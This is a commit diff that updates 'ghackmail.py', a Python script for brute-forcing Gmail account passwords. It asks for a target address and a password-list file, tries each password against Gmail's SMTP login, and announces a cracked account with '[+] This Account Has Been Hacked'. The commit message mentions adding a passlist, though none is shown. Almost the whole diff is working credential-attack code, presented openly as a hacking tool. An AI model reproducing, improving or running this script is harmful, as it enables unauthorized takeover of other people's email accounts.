de0f60740073e53546717782c26c0980a3f00f71
keressec <royandaniputra198728@gmail.com>
2023-08-09 10:07:22 +0700

    fix code, add passlist

--- ghackmail.py
+++ ghackmail.py
@@ -1,56 +1,55 @@
-#!/usr/bin/python
-'''b0t4k_k1ncl0nk is nub'''
-
 import smtplib
 from os import system
 
 def main():
-   print '================================================='
-   print '#          create by B0T4K_K1NCL0NK             #'
-   print '================================================='
-   print '#   +    +  ++++  +     +     +++++  +       +  #'
-   print '#   +    +  +     +     +     +   +  +       +  #'
-   print '#   +    +  +     +     +     +   + : +     +   #'
-   print '#   ++++++  ++++  +     +     +   + :  +   +    #'
-   print '#   +    +  +     +     +     +   + :   + +     #'
-   print '#   +    +  ++++  ++++  ++++  +++++      +      #'
-   print '================================================='
+    print('=================================================')
+    print('#          created by B0T4K_K1NCL0NK             #')
+    print('=================================================')
+    print('#   +    +  ++++  +     +     +++++  +       +  #')
+    print('#   +    +  +     +     +     +   +  +       +  #')
+    print('#   +    +  +     +     +     +   + : +     +   #')
+    print('#   ++++++  ++++  +     +     +   + :  +   +    #')
+    print('#   +    +  +     +     +     +   + :   + +     #')
+    print('#   +    +  ++++  ++++  ++++  +++++      +      #')
+    print('=================================================')
 
+    print('\n\n[1] Enter target email (gmail account)')
+    print('\n\n[2] Exit')
+    option = int(input('\n\nSelect One!!==> '))
 
-main()
-print ' \n \n[1] Enter e-mail target (gmail account)'
-print ' \n \n[2] Exit                '
-option = input('\n\nSelect One!!==>')
-if option == 1:
-   file_path = raw_input('path of passwords file (example : passlist.txt) :')
-else:
-   system('clear')
-   exit()
-pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
-def login():
-    i = 0
-    user_name = raw_input('target email :')
+    if option == 1:
+        file_path = input('Path of passwords file (example: passlist.txt): ')
+        login(file_path)
+    else:
+        system('clear')
+        exit()
+
+def login(file_path):
+    user_name = input('Target email: ')
+    pass_file = open(file_path, 'r')
+    pass_list = pass_file.readlines()
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
-    for password in pass_list:
-      i = i + 1
-      print str(i) + '/' + str(len(pass_list))
-      try:
-         server.login(user_name, password)
-         system('clear')
-         main()
-         print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
-         break
-      except smtplib.SMTPAuthenticationError as e:
-         error = str(e)
-         if error[14] == '<':
+
+    for index, password in enumerate(pass_list, start=1):
+        print(f'{index}/{len(pass_list)}')
+        try:
+            server.login(user_name, password)
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
-
+            print('\n')
+            print(f'[+] This Account Has Been Hacked Password: {password} ^_^')
             break
-         else:
-            print '[!] password not found => ' + password
-login()
+        except smtplib.SMTPAuthenticationError as e:
+            error = str(e)
+            if error[14] == '<':
+                system('clear')
+                main()
+                print(f'[+] This account has been hacked, password: {password} ^_^')
+                break
+            else:
+                print(f'[!] Password not found: {password}')
+
+    server.quit()
+
+main()
